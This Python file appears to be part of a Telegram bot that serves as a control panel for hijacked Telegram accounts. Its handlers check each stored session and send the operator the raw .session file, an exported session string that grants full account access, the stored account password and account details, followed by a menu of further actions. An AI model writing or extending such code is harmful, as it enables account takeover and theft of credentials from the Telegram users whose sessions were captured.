from aiogram import types
from aiogram.dispatcher.filters import CommandStart, ChatTypeFilter, Text
from aiogram.types import InputFile
from pyrogram import Client

from data.config import ADMINS_ID, API_ID, API_HASH
from keyboards.inline.actions_kb import actions_kb
from keyboards.inline.sessions_kb import sessions_kb
from loader import dp
from utils.db_commands import select_session, delete_session


@dp.message_handler(CommandStart(), ChatTypeFilter(chat_type=types.ChatType.PRIVATE), user_id=ADMINS_ID, state='*')
async def start_bot(message: types.Message):
    await message.answer(
        '<b>⚡️ Список сессий:</b>',
        reply_markup=await sessions_kb()
    )


@dp.callback_query_handler(Text(startswith='session'))
async def get_session(call: types.CallbackQuery):
    await call.answer(
        '♻️ Проверка сессии...'
    )
    session_id = int(call.data.split('|')[1])
    session = await select_session(session_id)
    try:
        if session:
            app = Client(f'sessions/{session.phone}', API_ID, API_HASH)
            await app.connect()
            user = await app.get_me()
            if user:
                password = f'🛡 Пароль: <code>{session.password}</code>\n\n' if session.password != '' else ''
                await call.message.delete()
                await call.message.answer_document(
                    InputFile(f'sessions/{session.phone}.session'),
                    caption=f'<b>✅ Сессия рабочая!</b>\n\n'
                            f'👤 Пользователь: <b>@{user.username}</b> [<code>{user.id}</code>]\n'
                            f'📞 Телефон: <code>+{session.phone}</code>\n'
                            f'{password}'
                            f'🌟 Премиум: <code>{user.is_premium}</code>\n'
                            f'🚫 Скам: <code>{user.is_scam}</code>\n'
                            f'🔑 Строка сессии (Pyrogram): \n<code>{(await app.export_session_string())}</code>\n\n'
                            f'<b>⚙️ Выберите действие:</b>',
                    reply_markup=actions_kb(session_id, session.phone)
                )
            else:
                await delete_session(session_id)
                await call.message.delete()
                await call.message.answer(
                    '<b>❌ Сессия не рабочая!</b>'
                )
                await call.message.answer(
                    '<b>⚡️ Список сессий:</b>',
                    reply_markup=await sessions_kb()
                )
            await app.disconnect()
        else:
            await call.message.delete()
            await call.message.answer(
                '<b>❗️ Такой сессии не существует!</b>'
            )
            await call.message.answer(
                '<b>⚡️ Список сессий:</b>',
                reply_markup=await sessions_kb()
            )
    except Exception:
        await delete_session(session_id)
        await call.message.delete()
        await call.message.answer(
            '<b>❌ Сессия не рабочая!</b>'
        )
